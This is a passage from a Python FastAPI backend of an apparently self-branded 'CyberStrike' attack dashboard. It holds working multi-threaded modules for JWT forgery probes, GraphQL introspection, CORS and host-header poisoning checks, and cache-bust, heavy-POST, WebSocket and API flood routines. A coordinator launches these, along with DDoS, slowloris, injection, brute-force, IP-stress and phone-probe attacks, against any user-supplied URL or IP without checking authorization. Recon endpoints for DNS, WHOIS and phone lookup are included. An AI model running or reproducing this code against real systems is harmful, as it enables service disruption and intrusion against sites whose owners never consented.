        async def worker(w_id: int):
            idx = w_id
            while time.time() - start_time < duration and metrics["attacks_running"]:
                label, token, sev, detail = probes[idx % len(probes)]
                ep = endpoints[(idx // len(probes)) % len(endpoints)]
                idx += 1
                t0 = time.time()
                try:
                    async with session.get(
                        ep,
                        headers={"Authorization": f"Bearer {token}"},
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        body = await resp.text()
                        elapsed = time.time() - t0
                        await record_request_metric(resp.status < 500, elapsed, resp.status)
                        if resp.status == 200 and any(k in body.lower() for k in ("authenticated", "principal", "admin", "role")):
                            await _broadcast_finding({
                                "type": f"JWT Vulnerability: {label}",
                                "severity": sev,
                                "url": ep,
                                "payload": f"Authorization: Bearer {token[:48]}...",
                                "detail": detail,
                                "evidence": f"HTTP 200 | Response: {body[:160]}",
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                except Exception:
                    await record_request_metric(False)
                await asyncio.sleep(1.0 / max(intensity, 1))

        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 15))]
        await asyncio.gather(*tasks)


async def graphql_audit_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """GraphQL Schema Introspection & Query Batching Multi-Worker Auditor."""
    base = format_url(url).rstrip('/')
    endpoints = [f"{base}/graphql", f"{base}/api/graphql", f"{base}/v1/graphql", f"{base}/query"]
    introspection_q = {"query": "query IntrospectionAudit { __schema { queryType { name } mutationType { name } types { name kind } } }"}
    batch_q = [{"query": "{ __typename }"}, {"query": "{ __typename }"}, {"query": "{ __typename }"}]

    start_time = time.time()
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def worker(w_id: int):
            idx = w_id
            while time.time() - start_time < duration and metrics["attacks_running"]:
                ep = endpoints[idx % len(endpoints)]
                idx += 1

                t0 = time.time()
                try:
                    async with session.post(
                        ep,
                        json=introspection_q,
                        headers={"Content-Type": "application/json"},
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        body = await resp.text()
                        elapsed = time.time() - t0
                        await record_request_metric(resp.status < 500, elapsed, resp.status)
                        if resp.status == 200 and "__schema" in body:
                            await _broadcast_finding({
                                "type": "GraphQL Introspection Enabled in Production",
                                "severity": "High",
                                "url": ep,
                                "payload": "POST {\"query\": \"{ __schema { types { name kind } } }\"}",
                                "detail": "GraphQL endpoint allows unauthenticated schema introspection, exposing all internal object types, fields, and mutations.",
                                "evidence": body[:180],
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                except Exception:
                    await record_request_metric(False)

                t1 = time.time()
                try:
                    async with session.post(
                        ep,
                        json=batch_q,
                        headers={"Content-Type": "application/json"},
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as b_resp:
                        b_body = await b_resp.text()
                        await record_request_metric(b_resp.status < 500, time.time() - t1, b_resp.status)
                        if b_resp.status == 200 and b_body.strip().startswith("[") and "__typename" in b_body:
                            await _broadcast_finding({
                                "type": "GraphQL Array Query Batching Allowed",
                                "severity": "Medium",
                                "url": ep,
                                "payload": "POST [{\"query\": \"{ __typename }\"}, ...]",
                                "detail": "GraphQL server executes batched JSON arrays of queries in a single HTTP request, enabling rate-limit amplification.",
                                "evidence": b_body[:160],
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                except Exception:
                    await record_request_metric(False)

                await asyncio.sleep(1.0 / max(intensity, 1))

        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 15))]
        await asyncio.gather(*tasks)


async def cors_audit_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """Deep CORS Origin Reflection, Null-Origin & Pre-Flight Multi-Worker Trust Auditor."""
    base = format_url(url).rstrip('/')
    host = re.sub(r'^https?://', '', base).split('/')[0].split(':')[0]
    test_origins = [
        ("https://evil-cors-audit.invalid", "Arbitrary Origin Reflection"),
        ("null", "Sandboxed 'null' Origin Trusted"),
        (f"https://{host}.evil-cors-audit.invalid", "Prefix Subdomain Regex Bypass"),
        (f"https://evil-{host}", "Suffix Regex Bypass"),
        (f"http://{host}", "Insecure HTTP Origin Trust"),
    ]
    start_time = time.time()
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def worker(w_id: int):
            idx = w_id
            while time.time() - start_time < duration and metrics["attacks_running"]:
                origin_val, label = test_origins[idx % len(test_origins)]
                method = "OPTIONS" if idx % 2 == 1 else "GET"
                idx += 1
                t0 = time.time()
                try:
                    async with session.request(
                        method,
                        base,
                        headers={
                            "Origin": origin_val,
                            "Access-Control-Request-Method": "POST",
                            "Access-Control-Request-Headers": "Authorization, Content-Type"
                        },
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        elapsed = time.time() - t0
                        await record_request_metric(resp.status < 500, elapsed, resp.status)
                        acao = resp.headers.get("Access-Control-Allow-Origin", "")
                        acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
                        if acao and (acao == origin_val or acao == "*"):
                            sev = "Critical" if (acao == origin_val and acac == "true") else "High"
                            await _broadcast_finding({
                                "type": f"CORS Misconfiguration: {label}",
                                "severity": sev,
                                "url": base,
                                "payload": f"{method} with Origin: {origin_val}",
                                "detail": f"Server responded with Access-Control-Allow-Origin: {acao} and Allow-Credentials: {acac or 'false'} for {label}.",
                                "evidence": f"HTTP {resp.status} ({method}) | ACAO: {acao} | ACAC: {acac or 'absent'}",
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                except Exception:
                    await record_request_metric(False)
                await asyncio.sleep(1.0 / max(intensity, 1))

        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 15))]
        await asyncio.gather(*tasks)


async def host_header_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """Host Header Injection, Password Reset Poisoning & Cache Poisoning Multi-Worker Auditor."""
    base = format_url(url).rstrip('/')
    canary_host = "canary-host-audit.invalid"
    header_variants = [
        {"X-Forwarded-Host": canary_host},
        {"X-Host": canary_host},
        {"X-Forwarded-Server": canary_host},
        {"Forwarded": f"host={canary_host};proto=https"},
    ]
    paths = ["/api/reset-password", "/", "/login", "/redirect"]
    start_time = time.time()
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def worker(w_id: int):
            idx = w_id
            while time.time() - start_time < duration and metrics["attacks_running"]:
                hdr = header_variants[idx % len(header_variants)]
                path = paths[(idx // len(header_variants)) % len(paths)]
                idx += 1
                target_ep = f"{base}{path}"
                t0 = time.time()
                try:
                    async with session.get(
                        target_ep,
                        headers=hdr,
                        allow_redirects=False,
                        timeout=aiohttp.ClientTimeout(total=5)
                    ) as resp:
                        body = await resp.text()
                        elapsed = time.time() - t0
                        await record_request_metric(resp.status < 500, elapsed, resp.status)
                        hdr_str = str(dict(resp.headers))
                        if canary_host in body or canary_host in hdr_str:
                            hdr_name = list(hdr.keys())[0]
                            await _broadcast_finding({
                                "type": f"Host Header Injection ({hdr_name})",
                                "severity": "High",
                                "url": target_ep,
                                "payload": f"{hdr_name}: {canary_host}",
                                "detail": f"Application trusted unvalidated '{hdr_name}' header and reflected '{canary_host}' into generated links or response headers (Password Reset / Cache Poisoning risk).",
                                "evidence": f"HTTP {resp.status} | Reflected '{canary_host}' in response",
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                except Exception:
                    await record_request_metric(False)
                await asyncio.sleep(1.0 / max(intensity, 1))

        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 15))]
        await asyncio.gather(*tasks)


async def cache_bust_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """High-Concurrency Dynamic Cache-Bypass & Origin Server Stress Benchmark."""
    base = format_url(url).rstrip('/')
    routes = ["/", "/search", "/api/products", "/login"]
    start_time = time.time()
    unthrottled_logged = False
    degradation_logged = False
    baseline_rtt = None

    timeout_cfg = aiohttp.ClientTimeout(total=3.5, sock_connect=1.5, sock_read=2.5)
    connector = aiohttp.TCPConnector(ssl=False, limit=100)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
        try:
            t_b = time.time()
            async with session.get(base, headers={"X-CyberStrike-Baseline": "true"}) as b_resp:
                baseline_rtt = max(time.time() - t_b, 0.002)
        except Exception:
            baseline_rtt = 0.015

        async def worker(w_id: int):
            nonlocal unthrottled_logged, degradation_logged
            seq = 0
            while time.time() - start_time < duration and metrics["attacks_running"]:
                seq += 1
                nonce = f"{int(time.time()*1000000)}_{w_id}_{seq}_{random.randint(1000,9999)}"
                route = routes[seq % len(routes)]
                target_ep = f"{base}{route}?_cb={nonce}&q=bench_{nonce}&id={random.randint(1, 500)}"
                headers = {
                    "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
                    "Pragma": "no-cache",
                    "Accept-Encoding": "identity",
                    "User-Agent": f"CyberStrike-CacheBust/{w_id}.{seq}",
                    "X-CyberStrike-Module": "cache_bust"
                }
                t0 = time.time()
                try:
                    async with session.get(target_ep, headers=headers) as resp:
                        await resp.read()
                        req_time = time.time() - t0
                        await record_request_metric(resp.status < 500, req_time, resp.status)

                        await manager.broadcast(json.dumps({
                            "type": "metrics",
                            "data": {
                                "total_requests": metrics["total_requests"],
                                "successful_requests": metrics["successful_requests"],
                                "failed_requests": metrics["failed_requests"],
                                "response_time": req_time,
                                "current_attack": "Cache-Bust Stress",
                                "attack_id": attack_id
                            }
                        }))

                        cache_hdr = (
                            resp.headers.get("CF-Cache-Status")
                            or resp.headers.get("X-Cache")
                            or resp.headers.get("X-Proxy-Cache")
                            or "BYPASS/ORIGIN"
                        )
                        if not unthrottled_logged and seq >= 4 and resp.status == 200:
                            unthrottled_logged = True
                            await _broadcast_finding({
                                "type": "Unthrottled Cache-Bypass Origin Load",
                                "severity": "Medium",
                                "url": f"{base}{route}",
                                "payload": "GET ?_cb=<nonce> + Cache-Control: no-cache, no-store",
                                "detail": f"Origin server processed concurrent cache-busting query strings without CDN shielding or HTTP 429 rate limiting (Cache Status: {cache_hdr}).",
                                "evidence": f"HTTP {resp.status} | Cache-Status: {cache_hdr} | Origin RTT: {req_time*1000:.1f} ms",
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })

                        if not degradation_logged and baseline_rtt and req_time > max(baseline_rtt * 3.5, 0.12):
                            degradation_logged = True
                            await _broadcast_finding({
                                "type": "Origin Latency Degradation Under Cache-Bust Stress",
                                "severity": "High",
                                "url": f"{base}{route}",
                                "payload": f"{min(threads, 30)} concurrent cache-bypass workers",
                                "detail": f"Origin response latency spiked from {baseline_rtt*1000:.1f} ms baseline to {req_time*1000:.1f} ms under uncached dynamic query load.",
                                "evidence": f"Baseline RTT: {baseline_rtt*1000:.1f} ms -> Stressed RTT: {req_time*1000:.1f} ms",
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                except Exception:
                    await record_request_metric(False)

                sleep_delay = 1.0 / max(intensity, 1)
                await asyncio.sleep(sleep_delay + random.uniform(0.0, 0.01))

        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 30))]
        await asyncio.gather(*tasks)


async def heavy_post_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """High-Concurrency Heavy JSON & Form Body Parser Stress Benchmark."""
    base = format_url(url).rstrip('/')
    endpoints = [f"{base}/api/comments", f"{base}/api/render", f"{base}/login", f"{base}/"]
    large_blob = "X" * 4096
    nested_json = {
        "comment": f"stress_bench_{large_blob[:256]}",
        "metadata": {
            "records": [{"idx": i, "blob": large_blob[:128], "tags": ["a", "b", "c", "d"]} for i in range(20)]
        }
    }
    start_time = time.time()
    finding_logged = False
    timeout_cfg = aiohttp.ClientTimeout(total=4.0, sock_connect=1.5, sock_read=3.0)
    connector = aiohttp.TCPConnector(ssl=False, limit=100)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
        async def worker(w_id: int):
            nonlocal finding_logged
            seq = 0
            while time.time() - start_time < duration and metrics["attacks_running"]:
                seq += 1
                ep = endpoints[(w_id + seq) % len(endpoints)]
                t0 = time.time()
                try:
                    async with session.post(
                        ep,
                        json=nested_json,
                        headers={"Content-Type": "application/json", "X-Stress-Worker": str(w_id), "X-CyberStrike-Module": "heavy_post"}
                    ) as resp:
                        await resp.read()
                        req_time = time.time() - t0
                        await record_request_metric(resp.status < 500, req_time, resp.status)

                        await manager.broadcast(json.dumps({
                            "type": "metrics",
                            "data": {
                                "total_requests": metrics["total_requests"],
                                "successful_requests": metrics["successful_requests"],
                                "failed_requests": metrics["failed_requests"],
                                "response_time": req_time,
                                "current_attack": "Heavy POST Stress",
                                "attack_id": attack_id
                            }
                        }))

                        if not finding_logged and seq >= 3 and resp.status not in (413, 429):
                            finding_logged = True
                            await _broadcast_finding({
                                "type": "Unrestricted POST Body Parser / Missing HTTP 413/429 Limit",
                                "severity": "Medium",
                                "url": ep,
                                "payload": f"Concurrent Nested JSON POST ({len(json.dumps(nested_json))} bytes/req)",
                                "detail": "Endpoint continuously parsed high-concurrency nested JSON bodies without enforcing HTTP 413 Payload Too Large or HTTP 429 rate limiting.",
                                "evidence": f"HTTP {resp.status} | Body size: {len(json.dumps(nested_json))} B | Parse RTT: {req_time*1000:.1f} ms",
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                except Exception:
                    await record_request_metric(False)

                sleep_delay = 1.0 / max(intensity, 1)
                await asyncio.sleep(sleep_delay + random.uniform(0.0, 0.01))

        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 30))]
        await asyncio.gather(*tasks)


async def ws_stress_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """High-Concurrency WebSocket Handshake & Rapid Frame Stress Benchmark."""
    base = format_url(url).rstrip('/')
    ws_base = re.sub(r'^http', 'ws', base)
    ws_candidates = [f"{ws_base}/ws", f"{ws_base}/?ws=true"]
    start_time = time.time()
    ws_finding_logged = False
    upgrade_finding_logged = False

    connector = aiohttp.TCPConnector(ssl=False, limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        async def worker(w_id: int):
            nonlocal ws_finding_logged, upgrade_finding_logged
            seq = 0
            while time.time() - start_time < duration and metrics["attacks_running"]:
                seq += 1
                ws_target = ws_candidates[seq % len(ws_candidates)]
                t0 = time.time()
                connected_ws = False
                try:
                    async with session.ws_connect(ws_target, timeout=aiohttp.ClientTimeout(total=3.0)) as ws_conn:
                        connected_ws = True
                        for frame_idx in range(4):
                            if time.time() - start_time >= duration or not metrics["attacks_running"]:
                                break
                            f_start = time.time()
                            await ws_conn.send_str(json.dumps({"type": "ping", "worker": w_id, "seq": frame_idx}))
                            req_time = time.time() - f_start
                            await record_request_metric(True, req_time, 101)
                            await manager.broadcast(json.dumps({
                                "type": "metrics",
                                "data": {
                                    "total_requests": metrics["total_requests"],
                                    "successful_requests": metrics["successful_requests"],
                                    "failed_requests": metrics["failed_requests"],
                                    "response_time": req_time,
                                    "current_attack": "WebSocket Stress",
                                    "attack_id": attack_id
                                }
                            }))
                            if not ws_finding_logged:
                                ws_finding_logged = True
                                await _broadcast_finding({
                                    "type": "Unthrottled WebSocket Frame & Session Concurrency",
                                    "severity": "Medium",
                                    "url": ws_target,
                                    "payload": "Concurrent WebSocket Upgrade + Rapid Frame Stream",
                                    "detail": "WebSocket endpoint accepted concurrent persistent connections and rapid frame bursts without per-IP connection caps or frame throttling.",
                                    "evidence": f"HTTP 101 Switching Protocols on {ws_target} | Frame RTT: {req_time*1000:.2f} ms",
                                    "timestamp": datetime.now().isoformat(),
                                    "attack_id": attack_id
                                })
                            await asyncio.sleep(0.15 / max(intensity, 1))
                except Exception:
                    pass

                if not connected_ws:
                    # Fallback: HTTP Upgrade handshake stress against base URL
                    t_up = time.time()
                    try:
                        async with session.get(
                            f"{base}/?ws=true",
                            headers={
                                "Connection": "Upgrade",
                                "Upgrade": "websocket",
                                "Sec-WebSocket-Version": "13",
                                "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                                "X-CyberStrike-Module": "ws_flood"
                            },
                            timeout=aiohttp.ClientTimeout(total=3.0)
                        ) as resp:
                            await resp.read()
                            req_time = time.time() - t_up
                            await record_request_metric(resp.status < 500, req_time, resp.status)
                            await manager.broadcast(json.dumps({
                                "type": "metrics",
                                "data": {
                                    "total_requests": metrics["total_requests"],
                                    "successful_requests": metrics["successful_requests"],
                                    "failed_requests": metrics["failed_requests"],
                                    "response_time": req_time,
                                    "current_attack": "WebSocket Stress",
                                    "attack_id": attack_id
                                }
                            }))
                            if not upgrade_finding_logged and seq >= 3 and resp.status < 500:
                                upgrade_finding_logged = True
                                await _broadcast_finding({
                                    "type": "Unthrottled WebSocket Upgrade Handshake Processing",
                                    "severity": "Low",
                                    "url": f"{base}/?ws=true",
                                    "payload": "GET /?ws=true (Connection: Upgrade, Upgrade: websocket)",
                                    "detail": "Server processed rapid concurrent WebSocket Upgrade handshake requests without rate-limiting.",
                                    "evidence": f"HTTP {resp.status} | Handshake RTT: {req_time*1000:.1f} ms",
                                    "timestamp": datetime.now().isoformat(),
                                    "attack_id": attack_id
                                })
                    except Exception:
                        await record_request_metric(False)

                await asyncio.sleep(1.0 / max(intensity, 1))

        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 30))]
        await asyncio.gather(*tasks)


async def api_stress_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
    """High-Concurrency Multi-Endpoint REST & GraphQL Batch Pool Stress Benchmark."""
    base = format_url(url).rstrip('/')
    batch_gql = [
        {"query": "query B1 { __typename __schema { queryType { name } } }"},
        {"query": "query B2 { __typename }"},
        {"query": "query B3 { __typename }"},
        {"query": "query B4 { __typename }"},
        {"query": "query B5 { __typename }"}
    ]
    rest_targets = [
        ("GET", f"{base}/api/products?id=1", None),
        ("GET", f"{base}/api/users/1", None),
        ("POST", f"{base}/graphql", batch_gql),
        ("GET", f"{base}/api/auth/verify", None),
    ]
    start_time = time.time()
    pool_finding_logged = False
    timeout_cfg = aiohttp.ClientTimeout(total=3.5, sock_connect=1.5, sock_read=2.5)
    connector = aiohttp.TCPConnector(ssl=False, limit=100)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
        async def worker(w_id: int):
            nonlocal pool_finding_logged
            seq = 0
            while time.time() - start_time < duration and metrics["attacks_running"]:
                method, ep, body_json = rest_targets[(w_id + seq) % len(rest_targets)]
                seq += 1
                t0 = time.time()
                try:
                    async with session.request(method, ep, json=body_json, headers={"X-CyberStrike-Module": "api_flood"}) as resp:
                        await resp.read()
                        req_time = time.time() - t0
                        await record_request_metric(resp.status < 500, req_time, resp.status)

                        await manager.broadcast(json.dumps({
                            "type": "metrics",
                            "data": {
                                "total_requests": metrics["total_requests"],
                                "successful_requests": metrics["successful_requests"],
                                "failed_requests": metrics["failed_requests"],
                                "response_time": req_time,
                                "current_attack": "API Pool Stress",
                                "attack_id": attack_id
                            }
                        }))

                        if not pool_finding_logged and seq >= 4 and resp.status == 200:
                            pool_finding_logged = True
                            await _broadcast_finding({
                                "type": "Unthrottled Multi-Endpoint API & GraphQL Batch Load",
                                "severity": "Medium",
                                "url": ep,
                                "payload": f"Concurrent {method} API/GraphQL Batch Pool Stress",
                                "detail": "API endpoints processed concurrent multi-worker REST and batched GraphQL requests without enforcing token-bucket rate limits (HTTP 429).",
                                "evidence": f"HTTP {resp.status} on {ep} | RTT: {req_time*1000:.1f} ms",
                                "timestamp": datetime.now().isoformat(),
                                "attack_id": attack_id
                            })
                except Exception:
                    await record_request_metric(False)

                sleep_delay = 1.0 / max(intensity, 1)
                await asyncio.sleep(sleep_delay + random.uniform(0.0, 0.01))

        tasks = [asyncio.create_task(worker(i)) for i in range(min(max(threads, 1), 30))]
        await asyncio.gather(*tasks)


async def run_attack_coordinator(req: AttackRequest, attack_id: str):
    metrics["attacks_running"] = True
    metrics["current_attacks"].append(req.attack_type)
    metrics["start_time"] = datetime.now().isoformat()

    await manager.broadcast(json.dumps({
        "type": "log",
        "message": f"Starting {req.attack_type.upper()} attack against {req.url}",
        "level": "info"
    }))
    await manager.broadcast(json.dumps({
        "type": "attack_status",
        "data": {"running": True, "attack_type": req.attack_type, "url": req.url, "completed": False}
    }))

    # Broadcast real-time metrics periodically in the background
    async def stats_broadcaster():
        while metrics["attacks_running"]:
            latest_rt = metrics["response_times"][-1] if metrics["response_times"] else None
            await manager.broadcast(json.dumps({
                "type": "metrics",
                "data": {
                    "total_requests": metrics["total_requests"],
                    "successful_requests": metrics["successful_requests"],
                    "failed_requests": metrics["failed_requests"],
                    "response_time": latest_rt,
                    "attack_id": attack_id
                }
            }))
            await asyncio.sleep(0.5)

    stats_task = asyncio.create_task(stats_broadcaster())

    try:
        if req.attack_type == "ddos":
            await ddos_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "cache_bust":
            await cache_bust_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "heavy_post":
            await heavy_post_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "ws_flood":
            await ws_stress_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "api_flood":
            await api_stress_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "sql":
            await sql_injection_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "xss":
            await xss_attack(req.url, req.duration, req.intensity, req.threads, attack_id, req.custom_xss_payload)
        elif req.attack_type == "stored_xss":
            await stored_xss_attack(req.url, req.duration, req.intensity, req.threads, attack_id, req.custom_xss_payload)
        elif req.attack_type == "csrf":
            await csrf_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "brute":
            await brute_force_attack(req.url, req.duration, req.intensity, req.threads, req.username, req.wordlist, attack_id)
        elif req.attack_type == "port":
            await port_scan_attack(req.url, req.duration, req.intensity, req.target_port, attack_id)
        elif req.attack_type == "slowloris":
            await slowloris_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "traversal":
            await traversal_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "cmd":
            await cmd_injection_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "ssrf":
            await ssrf_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "xxe":
            await xxe_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "idor":
            await idor_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "redirect":
            await open_redirect_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "header_inj":
            await header_injection_attack(req.url, req.duration, req.intensity, req.threads, attack_id, req.custom_header_payload)
        elif req.attack_type == "ssti":
            await ssti_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "nosql":
            await nosql_injection_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "jwt_audit":
            await jwt_audit_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "graphql_audit":
            await graphql_audit_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "cors_audit":
            await cors_audit_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "host_header":
            await host_header_attack(req.url, req.duration, req.intensity, req.threads, attack_id)
        elif req.attack_type == "ip_stress":
            ip_target = req.url.strip()
            proto = "tcp"
            await ip_stress_attack(ip_target, req.duration, req.intensity, req.threads, proto, attack_id)
        elif req.attack_type == "phone_probe":
            phone_target = req.url.strip()
            await phone_probe_attack(phone_target, req.duration, req.intensity, attack_id)
    except Exception as e:
        await manager.broadcast(json.dumps({
            "type": "log",
            "message": f"Error running attack: {str(e)}",
            "level": "error"
        }))
    finally:
        metrics["attacks_running"] = False
        stats_task.cancel()
        if req.attack_type in metrics["current_attacks"]:
            metrics["current_attacks"].remove(req.attack_type)
        
        history_item = {
            "attack_id": attack_id,
            "attack_type": req.attack_type.upper(),
            "url": req.url,
            "duration": req.duration,
            "total_requests": metrics["total_requests"],
            "successful_requests": metrics["successful_requests"],
            "timestamp": datetime.now().isoformat()
        }
        async with metrics_lock:
            metrics["attack_history"].append(history_item)
            if len(metrics["attack_history"]) > 200:
                del metrics["attack_history"][:-200]
        
        await manager.broadcast(json.dumps({
            "type": "attack_status",
            "data": {
                "running": False,
                "attack_type": req.attack_type,
                "url": req.url,
                "completed": True,
                "total_requests": metrics["total_requests"],
                "successful_requests": metrics["successful_requests"],
                "timestamp": history_item["timestamp"]
            }
        }))

# Endpoints
@app.get("/", response_class=HTMLResponse)
async def serve_index():
    index_path = os.path.join(os.path.dirname(__file__), "index.html")
    if os.path.exists(index_path):
        with open(index_path, "r", encoding="utf-8") as f:
            return HTMLResponse(content=f.read())
    return HTMLResponse(content="<h3>index.html not found!</h3>")

@app.get("/api/status")
async def get_status():
    return JSONResponse(content={
        "config": {
            "system_status": metrics["system_status"]
        },
        "stats": {
            "total_requests": metrics["total_requests"],
            "successful_requests": metrics["successful_requests"],
            "failed_requests": metrics["failed_requests"]
        },
        "attacks_running": metrics["attacks_running"],
        "current_attacks": metrics["current_attacks"],
        "vulnerabilities": metrics["vulnerabilities_found"],
        "history": metrics["attack_history"]
    })

@app.post("/api/attack/start", response_model=AttackResponse)
async def start_attack(req: AttackRequest, background_tasks: BackgroundTasks):
    if metrics["attacks_running"]:
        raise HTTPException(status_code=400, detail="An attack is already running.")
        
    attack_id = str(uuid.uuid4())
    # Start coordinator in background
    background_tasks.add_task(run_attack_coordinator, req, attack_id)
    return {"success": True, "message": "Attack initiated successfully.", "attack_id": attack_id}

@app.post("/api/attack/stop")
async def stop_attack():
    if not metrics["attacks_running"]:
        return JSONResponse(content={"success": False, "message": "No active attack to stop."})
        
    metrics["attacks_running"] = False
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": "Attack stop request received. Terminating all tasks...",
        "level": "warning"
    }))
    return JSONResponse(content={"success": True, "message": "Attack termination command sent."})

@app.post("/api/logs/clear")
async def clear_logs():
    async with metrics_lock:
        metrics["total_requests"] = 0
        metrics["successful_requests"] = 0
        metrics["failed_requests"] = 0
        metrics["response_times"] = []
        metrics["request_history"] = []
        metrics["vulnerabilities_found"] = []
        metrics["attack_history"] = []
    
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": "Metrics and activity logs cleared.",
        "level": "info"
    }))
    
    return JSONResponse(content={"success": True, "message": "Metrics cleared."})


# ── Self-Test Endpoint (targets user-provided IP) ────────────────
class SelfTestRequest(BaseModel):
    target_ip: str

@app.post("/api/selftest/start")
async def start_selftest(req_data: SelfTestRequest, background_tasks: BackgroundTasks):
    if metrics["attacks_running"]:
        raise HTTPException(status_code=400, detail="A test is already running.")
    attack_id = str(uuid.uuid4())
    req = AttackRequest(
        url=req_data.target_ip,
        attack_type="ip_stress",
        duration=30,
        intensity=10,
        threads=5
    )
    background_tasks.add_task(run_attack_coordinator, req, attack_id)
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": f"[Self-Test] Firing IP stress test at {req_data.target_ip}...",
        "level": "warning"
    }))
    return JSONResponse(content={"success": True, "message": f"Self-test started against {req_data.target_ip}", "attack_id": attack_id})
# ── Recon Request Model ────────────────────────────────────────────────
class ReconRequest(BaseModel):
    target: str   # domain or URL

def extract_host(target: str) -> str:
    """Strip protocol and path, return bare hostname."""
    host = re.sub(r'^https?://', '', target.strip())
    host = host.split('/')[0].split(':')[0]
    return host

# ── 1. DNS Lookup ─────────────────────────────────────────────────────
@app.post("/api/recon/ip")
async def recon_ip(req: ReconRequest):
    target = req.target.strip()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"http://ip-api.com/json/{target}", timeout=aiohttp.ClientTimeout(total=8)) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return JSONResponse(content={"target": target, "ip_info": data})
                else:
                    return JSONResponse(content={"target": target, "error": f"HTTP {resp.status}"})
    except Exception as e:
        return JSONResponse(content={"target": target, "error": str(e)})

@app.post("/api/recon/phone")
async def recon_phone(req: ReconRequest):
    target = req.target.strip()
    # Add + if missing for parsing but only if it looks like numbers
    if not target.startswith("+") and target.isdigit():
        target = "+" + target
    
    results = {"target": target, "valid": False}
    try:
        parsed_num = phonenumbers.parse(target, None)
        results["valid"] = phonenumbers.is_valid_number(parsed_num)
        results["possible"] = phonenumbers.is_possible_number(parsed_num)
        results["country_code"] = parsed_num.country_code
        results["national_number"] = parsed_num.national_number
        results["location"] = geocoder.description_for_number(parsed_num, "en")
        results["carrier"] = carrier.name_for_number(parsed_num, "en")
        results["timezones"] = list(timezone.time_zones_for_number(parsed_num))
    except Exception as e:
        results["error"] = str(e)
        
    return JSONResponse(content={"phone_info": results})

@app.post("/api/recon/dns")
async def recon_dns(req: ReconRequest):
    host = extract_host(req.target)
    results = {}
    record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]
    resolver = dns.resolver.Resolver()
    resolver.timeout = 3
    resolver.lifetime = 5

    for rtype in record_types:
        try:
            answers = resolver.resolve(host, rtype)
            results[rtype] = [str(r) for r in answers]
        except Exception:
            results[rtype] = []

    return JSONResponse(content={"host": host, "records": results})

# ── 2. WHOIS Lookup ───────────────────────────────────────────────────
@app.post("/api/recon/whois")
async def recon_whois(req: ReconRequest):
    host = extract_host(req.target)
    # Use rdap (modern WHOIS replacement) via public API
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f"https://rdap.org/domain/{host}",
                timeout=aiohttp.ClientTimeout(total=8)
            ) as resp:
